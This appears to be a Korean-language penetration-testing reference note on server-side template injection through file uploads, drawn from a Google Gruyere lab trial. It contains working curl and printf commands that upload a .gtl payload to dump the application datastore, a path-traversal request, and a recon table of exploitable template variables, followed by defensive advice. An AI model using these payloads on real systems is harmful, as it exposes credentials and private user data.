# Server-Side Template Injection — 업로드가 곧 템플릿 주입이 되는 경우

## 원리

"템플릿 파일을 업로드할 수 있다"와 "그 확장자를 서버가 템플릿으로 렌더한다"가 만나면,
파일 업로드는 **서버측 템플릿 주입**이 된다. 확장자 화이트리스트는 이때 오히려 위험을
키운다 — 화이트리스트가 "안전한 확장자"로 분류한 `.template` 류가 서버측 렌더러에
매핑돼 있으면, 업로드 검증을 통과한 파일이 서버에서 실행된다.

핵심 성질:
- 템플릿 엔진은 보통 **렌더 컨텍스트 전체**를 템플릿에 노출한다(요청 파라미터, 쿠키,
  세션/프로필, 그리고 애플리케이션 데이터스토어). 개발 편의용 디버그 escaper(`pprint` 등)가
  있으면 데이터스토어가 통째로 덤프된다.
- include/include 계열 지시자는 **경로이탈 파일 읽기**가 된다(→ `path-traversal` 문서).
- 렌더 결과는 보통 **인증 없이** 서빙된다 — 업로드만 인증이 필요하고, 결과를 읽는 것은
  아무나 할 수 있는 경우가 많다.

## 케이스 A — 확장자 화이트리스트를 통과한 템플릿 확장자

정적 서빙 코드가 확장자로 분기해 템플릿 렌더러로 넘기는 패턴:

```python
if filename.endswith('.gtl'):          # ← "정적 파일"이 아니라 템플릿
    self._SendTemplateResponse('/' + filename, specials, params)
```

공격자는 이 확장자로 파일을 올리기만 하면 된다.

```bash
printf 'START\n{{_db:pprint}}\nEND\n' > payload.gtl
curl -s -b <session> -F 'upload_file=@payload.gtl;filename=payload.gtl' \
  "https://<target>/<base>/upload"
# 업로드 파일은 보통 <base>/<user>/payload.gtl 로 서빙된다 — 쿠키 없이 요청
curl -s "https://<target>/<base>/<user>/payload.gtl" | sed -n '/START/,/END/p'
```

결과: 애플리케이션 데이터스토어가 그대로 렌더된다(계정·평문 자격증명·비공개 필드 포함).
→ **업로드 계정만 있으면(또는 업로드가 무인증이면 아예 계정 없이) 서버 데이터 전체 열람.**

## 케이스 B — 같은 파일이 "정적"과 "템플릿" 두 경로로 읽힌다

같은 디렉터리의 파일이 확장자만으로 분기되므로, **한쪽 경로에만 걸린 방어는 다른 쪽에서
무력**하다. 같은 파일에 대해 두 경로를 항상 대조하라.

```bash
curl -s "https://<target>/<base>/<user>/payload.gtl"        # 템플릿 렌더 (주입 성공)
curl -s --path-as-is "https://<target>/<base>/%2e%2e%2fpayload.gtl"  # 정적 경로 (차단될 수 있음)
```

## 케이스 C — 템플릿에서 쓸 수 있는 것들 (정찰 체크리스트)

렌더 컨텍스트에 무엇이 들어오는지 먼저 나열한다. 이름은 소스에서 확인할 수 있다
(`specials` 딕셔너리, escaper 목록).

| 노출 대상 | 흔한 이름 | 활용 |
|---|---|---|
| 데이터스토어 전체 | `_db` | `{{_db:pprint}}` 로 전량 덤프 |
| 요청 파라미터 | `_params` | `{{x:*param}}` 처럼 **필드명을 파라미터로 지정**하는 간접 참조 |
| 쿠키/세션 | `_cookie`, `_session` | 서버가 자기 쿠키를 어떻게 파싱하는지 확인(권한 플래그 포함) |
| 현재 사용자 | `_profile`, `_user` | 프로필·권한 플래그 |
| include | `[[include:...]]` | 경로이탈 파일 읽기 |
| 루프/조건 | `[[for:x]]`, `[[if:x]]` | 전 사용자 순회 |

**escaper 유무가 곧 출력 인코딩**이다. `:text`/`:html` 같은 escaper 가 붙지 않은
`{{value}}` 는 이스케이프되지 않는다(→ `xss-filter-bypass` 문서).

## 확인된 사례

- 재확인된 사례: `google-gruyere-trial` (Round 7 — `.gtl` 업로드가 서버 템플릿으로 렌더되어
  비인증 데이터스토어 덤프, `include` 경로이탈로 소스·시스템 파일 읽기). 커스텀 GTL 엔진.

## 방어 관점 메모

- 사용자 업로드 디렉터리는 **템플릿 렌더러 경로에서 제외**하고, 확장자 매핑을
  "정적 서빙 대상"과 "렌더 대상"으로 분리해 관리한다.
- 템플릿 컨텍스트에 데이터스토어·쿠키 객체를 직접 넣지 않고, 필요한 값만 명시적으로
  전달한다. 디버그 escaper(`pprint` 류)는 프로덕션 빌드에서 제거한다.

<!-- 출처: journal/web/google-gruyere-trial/, Round 7 -->
